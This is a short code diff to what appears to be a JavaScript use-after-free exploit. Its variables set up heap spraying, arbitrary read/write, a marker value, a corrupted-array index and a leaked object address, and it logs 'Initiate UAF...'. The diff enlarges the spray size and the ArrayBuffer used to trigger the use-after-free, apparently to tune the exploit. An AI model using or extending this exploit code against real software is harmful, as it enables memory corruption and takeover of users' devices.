@@ -3,7 +3,7 @@ include('defs.js')
 
 // needed for arw
 var u32_structs
-var spray_size = 0x10
+var spray_size = 0x100
 var marked_arr_offset = -1
 var corrupted_arr_idx = -1
 var marker = new BigInt(0xFFFF0000, 0x13371337)
@@ -17,7 +17,7 @@ var leak_obj, leak_obj_addr
 
 log('Initiate UAF...')
 
-var uaf_view = new DataView(new ArrayBuffer(0x40000))
+var uaf_view = new DataView(new ArrayBuffer(0x100000))
 
 uaf_view.setUint32(0x10, 0xB0, true)
 
